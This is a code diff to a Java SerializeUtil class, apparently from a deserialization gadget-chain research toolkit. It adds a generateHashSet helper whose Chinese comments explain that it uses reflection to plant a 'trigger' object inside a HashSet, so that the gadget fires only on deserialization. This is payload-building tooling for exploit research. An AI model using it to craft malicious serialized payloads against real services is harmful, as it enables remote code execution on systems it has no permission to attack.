@@ -5,6 +5,8 @@ import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
 
 import java.io.*;
 import java.lang.reflect.Field;
+import java.util.HashMap;
+import java.util.HashSet;
 
 /**
  * @author su18
@@ -100,6 +102,59 @@ public class SerializeUtil {
 	public static String genFilename(String className) {
 		String[] splits = className.split("\\.");
 		return splits[splits.length - 1] + ".bin";
+	}
+
+	/**
+	 * 生成用于反序列化的 HashSet，本质是使用反射将值写入其中的 HashMap 中
+	 * 避免在序列化时触发 Gadget
+	 *
+	 * @param object 待写入的触发类
+	 * @return 返回 HashSet
+	 */
+	public static HashSet<Object> generateHashSet(Object object) throws Exception {
+
+		// 初始化一个 HashSet s
+		HashSet<Object> set = new HashSet<>(1);
+		set.add("su18");
+
+		// 兼容不同版本 JDK
+		Field f;
+		try {
+			f = HashSet.class.getDeclaredField("map");
+		} catch (NoSuchFieldException e) {
+			f = HashSet.class.getDeclaredField("backingMap");
+		}
+
+		f.setAccessible(true);
+		HashMap innerMap = (HashMap) f.get(set);
+
+		Field f2 = null;
+		try {
+			f2 = HashMap.class.getDeclaredField("table");
+		} catch (NoSuchFieldException e) {
+			f2 = HashMap.class.getDeclaredField("elementData");
+		}
+
+		f2.setAccessible(true);
+
+		Object[] array = (Object[]) f2.get(innerMap);
+
+		Object node = array[0];
+		if (node == null) {
+			node = array[1];
+		}
+
+		Field keyField;
+		try {
+			keyField = node.getClass().getDeclaredField("key");
+		} catch (Exception e) {
+			keyField = Class.forName("java.util.MapEntry").getDeclaredField("key");
+		}
+
+		keyField.setAccessible(true);
+		keyField.set(node, object);
+
+		return set;
 	}
 
 }
